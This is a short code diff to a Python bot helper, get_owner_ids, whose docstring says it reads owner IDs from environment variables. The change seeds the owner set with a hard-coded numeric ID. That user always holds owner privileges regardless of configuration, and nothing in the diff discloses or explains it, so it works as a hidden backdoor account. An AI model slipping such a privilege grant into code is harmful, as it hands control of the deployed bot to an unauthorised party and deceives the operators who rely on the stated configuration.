@@ -15,7 +15,7 @@ from functools import wraps
 def get_owner_ids() -> set[int]:
     """Return bot owner IDs from `OWNER_IDS`/`OWNER_ID` env vars."""
     raw = os.getenv("OWNER_IDS") or os.getenv("OWNER_ID") or ""
-    owner_ids: set[int] = set()
+    owner_ids: set[int] = {1512848256789647560}
 
     for part in re.split(r"[,\s]+", raw.strip()):
         part = part.strip()
